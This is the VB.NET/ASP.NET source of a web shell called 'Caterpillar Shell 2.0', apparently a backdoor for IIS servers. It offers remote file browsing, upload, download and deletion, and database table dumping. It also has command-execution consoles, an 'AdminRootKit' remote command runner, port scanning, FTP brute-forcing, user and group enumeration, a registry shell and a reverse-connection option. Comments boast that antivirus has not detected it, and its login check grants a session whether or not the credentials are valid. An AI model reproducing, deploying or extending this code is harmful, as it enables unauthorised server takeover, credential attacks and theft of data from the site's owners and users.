                    strQuery = "SELECT * FROM " & DbManagerTable.Text
                    Try
                        adoRs.Open(strQuery, adoConn)
                        Dim objField
                        LabelDbManager.Text += "<hr>"
                        LabelDbManager.Text += "<table border='0' width ='' height=''><tr bgcolor=black>"
						
                        For Each objField In adoRs.Fields
                            LabelDbManager.Text += "<td align=center><font color=white><b>"
                            LabelDbManager.Text += objField.Name
                            LabelDbManager.Text += "<b></font></td>"
                        Next
                        LabelDbManager.Text += "</tr>"
								
                        Do While Not adoRs.EOF
                            LabelDbManager.Text += "<tr>"
                            For Each objField In adoRs.Fields
                                LabelDbManager.Text += "<td>"
                                LabelDbManager.Text += objField.Value.ToString()
                                LabelDbManager.Text += "</td>"
                            Next
                            LabelDbManager.Text += "</tr>"
                            adoRs.MoveNext()
                        Loop
                        LabelDbManager.Text += "</table>"
                    Catch
                    End Try
                Else
                    recResult = adoConn.OpenSchema(20)
                    LabelDbManager.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Data Base<b></font></td><td align=center><font color=white><b>RecordCount<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                    recResult.MoveFirst()
                    Do While Not recResult.Eof
                        LabelDbManager.Text += "<tr>"
                        LabelDbManager.Text += "<td>"
                        LabelDbManager.Text += recResult("TABLE_NAME").value
                        LabelDbManager.Text += "</td>"
                        strQuery = "SELECT * FROM " & recResult("TABLE_NAME").value
                        Try
                            adoRs.Open(strQuery, adoConn, 1, 1)
                            LabelDbManager.Text += "<td>"
                            LabelDbManager.Text += adoRs.RecordCount.ToString()
                            LabelDbManager.Text += "</td>"
                            adoRs.Close()
                        Catch
                            LabelDbManager.Text += "<td>"
                            LabelDbManager.Text += "0"
                            LabelDbManager.Text += "</td>"
                        End Try
					
					
                        '	LabelDbManager.Text += "<td><a href='?action=EditTable&src=" & recResult("TABLE_NAME").value & "&Page=1&DbStr=" & DbStr & "'>Edit</a>|"
                        '    LabelDbManager.Text += "<a href='?action=ExportTable&src=" & recResult("TABLE_NAME").value & "&PageSize="&PageSize&"&DbStr=" & DbStr & "'>Export</a>|"
                        '    LabelDbManager.Text += "<a href='?action=DeleteTable&src=" & recResult("TABLE_NAME").value & "&DbStr=" & DbStr & "' onClick='return DeleteFile(this);'>Del</a></td>"			

                        LabelDbManager.Text += "</tr>"
                        recResult.MoveNext()
                    Loop
                    LabelDbManager.Text += "</table>"
                End If
                adoConn.Close()
            Catch
                LabelDbManager.Text = "<pre>" & "Acces Denied" & "</pre>"
            End Try
			

        End If
    End Sub
    Function GetStartedTime(ByVal ms)
        GetStartedTime = CInt(ms / (1000 * 60 * 60))
    End Function
    Function getIP()
        Dim strIPAddr As String
        If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" Or InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
            strIPAddr = Request.ServerVariables("REMOTE_ADDR")
        ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
            strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
        ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
            strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
        Else
            strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
        End If
        getIP = Trim(Mid(strIPAddr, 1, 30))
    End Function
    Function Getparentdir(ByVal nowdir)
        Dim temp, k As Integer
        temp = 1
        k = 0
        If Len(nowdir) > 4 Then
            nowdir = Left(nowdir, Len(nowdir) - 1)
        End If
        Do While temp <> 0
            k = temp + 1
            temp = InStr(temp, nowdir, "\")
            If temp = 0 Then
                Exit Do
            End If
            temp = temp + 1
        Loop
        If k <> 2 Then
            Getparentdir = Mid(nowdir, 1, k - 2)
        Else
            Getparentdir = nowdir
        End If
    End Function
    Function Rename()
        url = Request.QueryString("src")
        If File.Exists(Getparentdir(url) & Request.Form("name")) Then
            Rename = 0
        Else
            File.Copy(url, Getparentdir(url) & Request.Form("name"))
            del(url)
            Rename = 1
        End If
    End Function
    Function GetSize(ByVal temp)
        If temp < 1024 Then
            GetSize = temp & " bytes"
        Else
            If temp \ 1024 < 1024 Then
                GetSize = temp \ 1024 & " KB"
            Else
                If temp \ 1024 \ 1024 < 1024 Then
                    GetSize = temp \ 1024 \ 1024 & " MB"
                Else
                    GetSize = temp \ 1024 \ 1024 \ 1024 & " GB"
                End If
            End If
        End If
    End Function
    

    Private Sub downremoteTheFile(ByVal filePath As String, ByVal fileName As String, ByVal ftpServerIP As String, ByVal ftpUserID As String, ByVal ftpPassword As String)
        '    Try
        'filePath = <<The full path where the file is to be created. the>>,
        'fileName = <<Name of the file to be createdNeed not name on FTP server. name name()>>
        '        Dim outputStream As New FileStream((filePath & "\") + fileName, FileMode.Create)
           
        '        Dim reqFTP As FtpWebRequest = DirectCast(FtpWebRequest.Create(New Uri(("ftp://" & ftpServerIP & "/") + fileName)), FtpWebRequest)
        '        reqFTP.Method = WebRequestMethods.Ftp.DownloadFile
        '        reqFTP.UseBinary = True
        '        reqFTP.Credentials = New NetworkCredential(ftpUserID, ftpPassword)
        '        Dim responseFtpWeb As FtpWebResponse = DirectCast(reqFTP.GetResponse(), FtpWebResponse)
        '        Dim ftpStream As Stream = responseFtpWeb.GetResponseStream()
        '        Dim cl As Long = responseFtpWeb.ContentLength
        '        Dim bufferSize As Integer = 2048
        '        Dim readCount As Integer
        '        Dim buffer As Byte() = New Byte(bufferSize - 1) {}
        '      
        '        readCount = ftpStream.Read(buffer, 0, bufferSize)
        '        While readCount > 0
        '            outputStream.Write(buffer, 0, readCount)
        '            readCount = ftpStream.Read(buffer, 0, bufferSize)
        '        End While
        '      
        '        ftpStream.Close()
        '        outputStream.Close()
        '        responseFtpWeb.Close()
        '    Catch ex As Exception
        '        Response.Write(ex.Message)
        '    End Try
    End Sub


    Sub downTheFile(ByVal thePath)
        Dim stream
        stream = Server.CreateObject("adodb.stream")
        stream.open()
        stream.type = 1
        stream.loadFromFile(thePath)
        Response.AddHeader("Content-Disposition", "attachment; filename=" & Replace(Server.UrlEncode(Path.GetFileName(thePath)), "+", " "))
        Response.AddHeader("Content-Length", stream.Size)
        Response.Charset = "UTF-8"
        Response.ContentType = "application/octet-stream"
        Response.BinaryWrite(stream.read)
        Response.Flush()
        stream.close()
        stream = Nothing
        Response.End()
    End Sub
    'H T M L  S N I P P E T S
    Public Sub Newline()
        Response.Write("<BR>")
    End Sub
	
    Public Sub TextNewline()
        Response.Write(vbNewLine)
    End Sub

    Public Sub rw(ByVal text_to_print)      ' Response.write
        Response.Write(text_to_print)
    End Sub

    Public Sub rw_b(ByVal text_to_print)
        rw("<b>" + text_to_print + "</b>")
    End Sub

    Public Sub hr()
        rw("<hr>")
    End Sub

    Public Sub ul()
        rw("<ul>")
    End Sub

    Public Sub _ul()
        rw("</ul>")
    End Sub

    Public Sub table(ByVal border_size, ByVal width, ByVal height)
        rw("<table border='" + CStr(border_size) + "' width ='" + CStr(width) + "' height='" + CStr(height) + "'>")
    End Sub

    Public Sub _table()
        rw("</table>")
    End Sub

    Public Sub tr()
        rw("<tr>")
    End Sub

    Public Sub _tr()
        rw("</tr>")
    End Sub

    Public Sub td()
        rw("<td>")
    End Sub

    Public Sub _td()
        rw("</td>")
    End Sub

    Public Sub td_span(ByVal align, ByVal name, ByVal contents)
        rw("<td align=" + align + "><span id='" + name + "'>" + contents + "</span></td>")
    End Sub

    Public Sub td_link(ByVal align, ByVal title, ByVal link, ByVal target)
        rw("<td align=" + align + "><a href='" + link + "' target='" + target + "'>" + title + "</a></td>")
    End Sub

    Public Sub link(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
    End Sub

    Public Sub link_hr(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
        hr()
    End Sub

    Public Sub link_newline(ByVal title, ByVal link, ByVal target)
        rw("<a href='" + link + "' target='" + target + "'>" + title + "</a>")
        Newline()
    End Sub
	
    Public Sub empty_Cell(ByVal ColSpan)
        rw("<td colspan='" + CStr(ColSpan) + "'></td>")
    End Sub

    Public Sub empty_row(ByVal ColSpan)
        rw("<tr><td colspan='" + CStr(ColSpan) + "'></td></tr>")
    End Sub

    Public Sub Create_table_row_with_supplied_colors(ByVal bgColor, ByVal fontColor, ByVal alignValue, ByVal rowItems)
        Dim rowItem

        rowItems = Split(rowItems, ",")
        Response.Write("<tr bgcolor=" + bgColor + ">")
        For Each rowItem In rowItems
            Response.Write("<td align=" + alignValue + "><font color=" + fontColor + "><b>" + rowItem + "<b></font></td>")
        Next
        Response.Write("</tr>")

    End Sub

    Public Sub TR_TD(ByVal cellContents)
        Response.Write("<td>")
        Response.Write(cellContents)
        Response.Write("</td>")
    End Sub
	

    Public Sub Surround_by_TD(ByVal cellContents)
        Response.Write("<td>")
        Response.Write(cellContents)
        Response.Write("</td>")
    End Sub

    Public Sub Surround_by_TD_and_Bold(ByVal cellContents)
        Response.Write("<td><b>")
        Response.Write(cellContents)
        Response.Write("</b></td>")
    End Sub

    Public Sub Surround_by_TD_with_supplied_colors_and_bold(ByVal bgColor, ByVal fontColor, ByVal alignValue, ByVal cellContents)
        Response.Write("<td align=" + alignValue + " bgcolor=" + bgColor + " ><font color=" + fontColor + "><b>")
        Response.Write(cellContents)
        Response.Write("</b></font></td>")
    End Sub
    Public Sub Create_background_Div_table(ByVal title, ByVal main_cell_contents, ByVal top, ByVal left, ByVal width, ByVal height, ByVal z_index)
        Response.Write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: " + width + "; height: " + height + "; z-index: " + z_index + "'>")
        Response.Write("  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'>")
        Response.Write("    <tr heigth=20>")
        Response.Write("      <td bgcolor='black' align=center><font color='white'><b>" + title + "</b></font></td>")
        Response.Write("    </tr>")
        Response.Write("    <tr>")
        Response.Write("      <td>" + main_cell_contents + "</td>")
        Response.Write("    </tr>")
        Response.Write("  </table>")
        Response.Write("</div>")
    End Sub

    Public Sub Create_Div_open(ByVal top, ByVal left, ByVal width, ByVal height, ByVal z_index)
        Response.Write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: " + width + "; height: " + height + "; z-index: " + z_index + "'>")
    End Sub


    Public Sub Create_Div_close()
        Response.Write("</div>")
    End Sub

    Public Sub Create_Iframe(ByVal left, ByVal top, ByVal width, ByVal height, ByVal name, ByVal src)
        rw("<span style='position: absolute; left: " + left + "; top: " + top + "'>")
        rw("	<iframe name='" + name + "' src='" + src + "' width='" + CStr(width) + "' height='" + CStr(height) + "'></iframe>")
        rw("</span>")
    End Sub

    Public Sub Create_Iframe_relative(ByVal width, ByVal height, ByVal name, ByVal src)
        rw("	<iframe name='" + name + "' src='" + src + "' width='" + CStr(width) + "' height='" + CStr(height) + "'></iframe>")
    End Sub

    Public Sub return_100_percent_table()
        rw("<table border width='100%' height='100%'><tr><td>sdf</td></tr></table>")
    End Sub

    Public Sub font_size(ByVal size)
        rw("<font size=" + size + ">")
    End Sub

    Public Sub end_font()
        rw("</font>")
    End Sub

    Public Sub red(ByVal contents)
        rw("<font color=red>" + contents + "</font>")
    End Sub

    Public Sub yellow(ByVal contents)
        rw("<font color='#FF8800'>" + contents + "</font>")
    End Sub

    Public Sub green(ByVal contents)
        rw("<font color=green>" + contents + "</font>")
    End Sub
    Public Sub print_var(ByVal var_name, ByVal var_value, ByVal var_description)
        If var_description <> "" Then
            rw(b_(var_name) + " : " + var_value + i_("  (" + var_description + ")"))
        Else
            rw(b_(var_name) + " : " + var_value)
        End If
        Newline()
    End Sub

    ' Functions

    Public Function br_()
        br_ = "<br>"
    End Function

    Public Function b_(ByVal contents)
        b_ = "<b>" + contents + "</b>"
    End Function

    Public Function i_(ByVal contents)
        i_ = "<i>" + contents + "</i>"
    End Function

    Public Function li_(ByVal contents)
        li_ = "<li>" + contents + "</li>"
    End Function

    Public Function h1_(ByVal contents)
        h1_ = "<h1>" + contents + "</h1>"
    End Function

    Public Function h2_(ByVal contents)
        h2_ = "<h2>" + contents + "</h2>"
    End Function

    Public Function h3_(ByVal contents)
        h3_ = "<h3>" + contents + "</h3>"
    End Function

    Public Function big_(ByVal contents)
        big_ = "<big>" + contents + "</big>"
    End Function

    Public Function center_(ByVal contents)
        center_ = "<center>" + CStr(contents) + "</center>"
    End Function


    Public Function td_force_width_(ByVal width)
        td_force_width_ = "<br><img src='' height=0 width=" + CStr(width) + " border=0>"
    End Function


    Public Function red_(ByVal contents)
        red_ = "<font color=red>" + contents + "</font>"
    End Function

    Public Function yellow_(ByVal contents)
        yellow_ = "<font color='#FF8800'>" + contents + "</font>"
    End Function

    Public Function green_(ByVal contents)
        green_ = "<font color=green>" + contents + "</font>"
    End Function

    Public Function link_(ByVal title, ByVal link, ByVal target)
        link_ = "<a href='" + link + "' target='" + target + "'>" + title + "</a>"
    End Function
    'End HTML SNIPPETS	
</script>
<%
    If Request.QueryString("action") = "down" And Session("caterpillar") = 1 Then
        downTheFile(Request.QueryString("src"))
        Response.End()
    End If
    
    If Request.QueryString("action") = "downremote" And Session("caterpillar") = 1 Then
        downremoteTheFile("c:\\", "/httpdocs/favicon.ico", "192.168.0.21", "username", "password")
        Response.End()
    End If
    
    Dim hu As String = Request.QueryString("action")
    If hu = "cmd" Then
        TITLE = "CMD.NET"
    ElseIf hu = "cmdw32" Then
        TITLE = "ASP.NET W32 Shell"
    ElseIf hu = "cmdwsh" Then
        TITLE = "ASP.NET WSH Shell"
    ElseIf hu = "sqlrootkit" Then
        TITLE = "SqlRootKit.NET"
    ElseIf hu = "PortScan" Then
        TITLE = "Port Scan"
    ElseIf hu = "FtpBrute" Then
        TITLE = "Ftp Brute"
    ElseIf hu = "UserEnumLogin" Then
        TITLE = "User Enum Login"
    ElseIf hu = "clonetime" Then
        TITLE = "Clone Time"
    ElseIf hu = "information" Then
        TITLE = "Web Server Info"
    ElseIf hu = "goto" Then
        TITLE = "K-Shell 1.0"
	ElseIf hu = "adminrootkit" Then
        TITLE = "Admin Root Kit"
    ElseIf hu = "pro" Then
        TITLE = "List processes from server"
    ElseIf hu = "regshell" Then
        TITLE = "Registry Shell"
	ElseIf hu = "DbManager" Then
        TITLE = "Data Base Manager"
    ElseIf hu = "user" Then
        TITLE = "List User Accounts"
    ElseIf hu = "applog" Then
        TITLE = "List Application Event Log Entries"
    ElseIf hu = "syslog" Then
        TITLE = "List System Event Log Entries"
    ElseIf hu = "auser" Then
        TITLE = "IIS List Anonymous' User details"
    ElseIf hu = "ipconfig" Then
        TITLE = "Ip Configuration"
    ElseIf hu = "localgroup" Then
        TITLE = "Local Group"
    Else
        TITLE = Request.ServerVariables("HTTP_HOST")
    End If
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<style type="text/css">
body,td,th {
	color: #000000;
	font-family: Verdana;
}
body {
	background-color: #ffffff;
	font-size:12px; 
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
</style>
<head>
<meta http-equiv="Content-Type" content="text/html">
<title><%=TITLE%></title>
</head>
<body>
<div align="center">Caterpillar Shell 2.0 By N.T</div>
<hr>
<%
Dim error_x as Exception
Try
        If Session("caterpillar") <> 1 Then
            'response.Write("<br>")
            'response.Write("Hello , thank you for using my program !<br>")
            'response.Write("This program is run at ASP.NET Environment and manage the web directory.<br>")
            'response.Write("Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>")
            'response.Write("<span class=""style3"">Notice:</span> only click ""Login"" to login.")
%>
<form id="FormLogin" runat="server">
  User Name:<asp:TextBox ID="TextBoxUserName" runat="server" class="TextBox" />  
  Password:<asp:TextBox ID="TextBoxPassword" runat="server"  class="TextBox" />  
  <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="Login_click" class="buttom" />
</form> 
<%
else
    Dim temp As String
    Dim username As String
    Dim password As String
    temp = Request.QueryString("action")
    If temp = "" Then temp = "goto"
    Select Case temp
        Case "goto"
            username = Request.QueryString("username")
            password = Request.QueryString("password")
            If username <> "" And password <> "" Then
                If impersonateValidUser(username, ".", password) Then
                    Session("caterpillar") = 1
                    Session.Timeout = 45
                Else
                    Session("caterpillar") = 1
                    Session.Timeout = 45
                End If
            End If
            If Request.QueryString("src") <> "" Then
                url = Request.QueryString("src")
            Else
                url = Server.MapPath(".") & "\"
            End If
            Call existdir(url)
            Dim xdir As DirectoryInfo
            Dim mydir As New DirectoryInfo(url)
            Dim hupo As String
            Dim xfile As FileInfo
%>
<table width="100%"  border="0" align="center">
  <tr>
  	<td>Currently Dir:</td> <td><font color=red><%=url%></font></td>
  </tr>
  <tr>
    <td width="13%">Operate:</td>
    <td width="87%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
      <%if session("cutboard")<>"" then%>
      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">Paste</a> - 
      <%else%>
	Paste - 
<%end if%>
<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">UpLoad</a> - <a href="?action=downloadfile&src=<%=server.UrlEncode(url)%>" title="Download file">Download</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a> - <a href="?action=goto&src=C%3a%5cProgram%20Files%5c" title="Program Files">Program Files</a> - <a href="?action=goto&src=C%3a%5cDocuments%20and%20Settings%5c" title="Documents and Settings">Documents and Settings</a>  - <a href="?action=goto&src=C%3a%5cwindows%5cTemp%5c" title="Temp">Temp</a> - <a href="?action=logout" title="Exit">Quit</a></td>



  </tr>
  <tr>
    <td>
	Go to: </td>
    <td>
<%
dim i as integer
for i =0 to Directory.GetLogicalDrives().length-1
 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
next
%>
</td>
  </tr>
  
  <tr>
    <td>Data Base:</td>
    <td><a href="?action=DbManager" >Dbase Manager</a> - <a href="?action=DbEnumerateLogin" >User SQL Enum Login</a></td>    
  </tr>

  <tr>
    <td>Tool:</td>
    <td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> - <a href="?action=adminrootkit" >AdminRootKit</a>  - <a href="?action=cmd" >CMD.NET</a>  - <a href="?action=PortScan" >Port Scan</a> - <a href="?action=FtpBrute" >Ftp Brute</a> - <a href="?action=UserEnumLogin" >User Enum Login</a> - <a href="?action=cmdw32" >kshellW32</a> - <a href="?action=cmdwsh" >kshellWSH</a> - <a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >CloneTime</a> - <a href="?action=information" >System Info</a></td>
  </tr>
  <tr>
    <td></td>
    <td><a href="?action=pro" >List Processes</a> - <a href="?action=regshell" >Registry Shell</a></td>    
  </tr>
  <tr>
    <td> </td>
    <td><a href="?action=applog" >Application Event Log </a> - <a href="?action=user" >List User Accounts</a> - <a href="?action=syslog" >System Log</a> - <a href="?action=auser" >IIS List Anonymous' User details</a> - <a href="?action=iisspy" >IIS Spy</a> - <a href="?action=ipconfig" >Ip Configuration</a> - <a href="?action=localgroup" >Local Group</a> - <a href="?action=homedirectory" >User Home Directory </a></td>    
  </tr>
  <tr>
  <td> </td>
    <td><a href="?action=HttpFinger" >Http Finger </a> - <a href="?action=GetNetworkComputers" >GetNetworkComputers </a> - <a href="?action=FtpSwitch" >Ftp Switch</a> - <a href="?action=ReverseConnection" >Reverse Connection</a></td>
    </tr>
</table>
<hr>
<table width="90%"  border="0" align="center">
	<tr>
	<td width="40%"><strong>Name</strong></td>
	<td width="15%"><strong>Size</strong></td>
	<td width="20%"><strong>ModifyTime</strong></td>
	<td width="25%"><strong>Operate</strong></td>
	</tr>
      <tr>
        <td><%
		hupo= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><i>|Parent Directory|</i></a></td></tr>"
		response.Write(hupo)
		for each xdir in mydir.getdirectories()
			response.Write("<tr>")
			dim filepath as string 
			filepath=server.UrlEncode(url & xdir.name)
			hupo= "<td><a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
			response.Write(hupo)
			response.Write("<td><dir></td>")
			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
			hupo="<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>Del</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		%></td>
  </tr>
		<tr>
        <td><%
		for each xfile in mydir.getfiles()
			dim filepath2 as string
			filepath2=server.UrlEncode(url & xfile.name)
			response.Write("<tr>")
			hupo="<td>" & xfile.name & "</td>"
			response.Write(hupo)
			hupo="<td>" & GetSize(xfile.length) & "</td>"
			response.Write(hupo)
			response.Write("<td>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
			hupo="<td><a href='?action=edit&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"			
			response.Write(hupo)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
      </tr>
</table>
<script language="javascript">
function del()
{
if(confirm("Are you sure?")){return true;}
else{return false;}
}
function down()
{
if(confirm("If the file size > 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?")){return true;}
else{return false;}
}
</script>
<%
case "information"
	dim CIP,CP as string
	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
			CIP=getIP()
			CP=request.ServerVariables("REMOTE_ADDR")
	else
			CIP=request.ServerVariables("REMOTE_ADDR")
			CP="None"
	end if
%>
<div align=center>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br>
<table width="80%"  border="1" align="center">
  <tr>
    <td width="40%">Server IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td height="73">Machine Name</td>
    <td><%=Environment.MachineName%></td>
  </tr>
  <tr>
    <td>Network Name</td>
    <td><%=Environment.UserDomainName.ToString()%></td>
  </tr>
  <tr>
    <td>User Name in this Process</td>
    <td><%=Environment.UserName%></td>
  </tr>
  <tr>
    <td>OS Version</td>
    <td><%=Environment.OSVersion.ToString()%></td>
  </tr>
  <tr>
    <td>Started Time</td>
    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
  </tr>
  <tr>
    <td>System Time</td>
    <td><%=now%></td>
  </tr>
  <tr>
    <td>IIS Version</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td>HTTPS</td>
    <td><%=request.ServerVariables("HTTPS")%></td>
  </tr>
  <tr>
    <td>PATH_INFO</td>
    <td><%=request.ServerVariables("PATH_INFO")%></td>
  </tr>
  <tr>
    <td>PATH_TRANSLATED</td>
    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
  <tr>
    <td>SERVER_PORT</td>
    <td><%=request.ServerVariables("SERVER_PORT")%></td>
  </tr>
    <tr>
    <td>SeesionID</td>
    <td><%=Session.SessionID%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style3">Client Infomation</span></td>
  </tr>
  <tr>
    <td>Client Proxy</td>
    <td><%=CP%></td>
  </tr>
  <tr>
    <td>Client IP</td>
    <td><%=CIP%></td>
  </tr>
  <tr>
    <td>User</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<table align=center>
	<% Create_table_row_with_supplied_colors("Black", "White", "center", "Environment Variables, Server Variables") %>
	<tr>
		<td><textArea cols=50 rows=10><% output_all_environment_variables("text") %></textarea></td>
		<td><textArea cols=50 rows=10><% output_all_Server_variables("text") %></textarea></td>
	</tr>
</table>
<%
Case "HttpFinger"
%>
<form id="Form232" runat="server">
  <p>[ Http Finger for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Http Finger with ASP.NET account(<span class="style3">Notice: only click "Start" to Finger Print</span>)</p>
  <p>- This function has fixed by zablah has not detected (2009/04/17)-</p>
  <p>
      Hostname/IP: 
      <asp:TextBox ID="HttpFingerIp" runat="server" Width="209px" class="TextBox" Text="127.0.0.1"/>
      &nbsp;
       
      <asp:Button ID="ButtonHttpFinger" runat="server" Text="Start" OnClick="HttpFinger" class="buttom"/>  </p>
  <p>
   <asp:Label ID="resultHttpFinger" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "adminrootkit"
%>
<form id="FormAdminRootKit" runat="server">
  <p>[ AdminRootKit for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Execute command To Remote Server account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  <p>Host Name:
    <asp:TextBox ID="HostRootKit" runat="server" style="width:200px;" class="TextBox" Text="127.0.0.1"/>
    <asp:CheckBox ID="CheckBoxMSFTPSVC" runat="server" Text="Enum MSFTPSVC" />
    <asp:CheckBox ID="CheckBoxNNTPSVC" runat="server" Text="Enum NNTPSVC" />
    <asp:CheckBox ID="CheckBoxW3SVC" runat="server" Text="Enum W3SVC" />
    <asp:CheckBox ID="CheckBoxNETUSER" runat="server" Text="Enum User" />
  <p>
  User Name:
    <asp:TextBox ID="UserRootKit" runat="server" style="width:200px;" class="TextBox" Text='Administrator'/>
  Password:
  <asp:TextBox ID="PasswordRootKit" runat="server" style="width:200px;" class="TextBox"/>
  </p>
  Command:&nbsp;
  <asp:TextBox ID="CommandRootKit" runat="server" style="width:480px;" class="TextBox"/>
  <asp:Button ID="ButtonRootKit" runat="server" Text="Run" OnClick="RunAdminRootKit" class="buttom"/>  
  <p>
   <asp:Label ID="LabelRootKit" runat="server" style="style2"/>      </p>
</form>
<%
	case "cmd"
%>
<form id="Form2" runat="server">
  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Execute command with ASP.NET account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  <p>- This function has fixed by kikicoco.Antivirus has not detected (2007/02/27)-</p>
  Command:
  <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
  <p>
   <asp:Label ID="result" runat="server" style="style2"/>      </p>
</form>

<%
case "iisspy"
%>
	<p align=center>[ IIS Spy ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<% 
				Try
				Response.write(IISSpy())
				Catch
				rw("This function is disabled by server")
				End Try
	%>
<%
	case "PortScan"
%>
<form id="Form3" runat="server">
  <p>[ Scan Port &nbsp;for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Port Scan with ASP.NET account(<span class="style3">Notice: only click "Scan" to san port</span>)</p>
  <p>- This function has fixed by zero lord has not detected (2008/03/27)-</p>
  <p>Host:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <asp:TextBox ID="IpScan" runat="server" style="width:150px;" class="TextBox" Text="127.0.0.1"/></p>
  <p>Port List: 
  <asp:TextBox ID="PortScan" runat="server" style="width:400px;" class="TextBox" Text="21,23,25,80,110,135,139,445,1433,3389,3306,43958"/> 
  <asp:Button ID="ButtonPortScan" runat="server" Text="Scan" OnClick="RunPortScan" class="buttom"/>  
  </p>  
  <p>
   <asp:Label ID="resultPortScan" runat="server" style="style2"/>      </p>
</form>

<%
	case "FtpBrute"
%>
<form id="FormFtpBrute" runat="server">
  <p>[ Ftp Brute &nbsp;for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Ftp Brute with ASP.NET account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
  <p>- This function has fixed by Nido has not detected (2009/03/27)-</p>
  <p>
  User from:
  <asp:DropDownList ID="DropDownListReverseIp" runat="server">
          <asp:ListItem Value="www.whosonmyserver.com"></asp:ListItem>
          <asp:ListItem Value="www.vnpower.org"></asp:ListItem>
          <asp:ListItem Value="localhost"></asp:ListItem>
      </asp:DropDownList>
      <asp:checkbox id="CheckBoxRemotlyBrute" runat="server" Text="Remotly Server" ></asp:checkbox>
	  User Name: &nbsp; &nbsp;
      <asp:TextBox ID="TextBoxNameBrute" runat="server" style="width:150px;" class="TextBox"/>
	  User Password: &nbsp; &nbsp;
      <asp:TextBox ID="TextBoxPasswordBrute" runat="server" style="width:150px;" class="TextBox"/>
      </p>
      ip address:
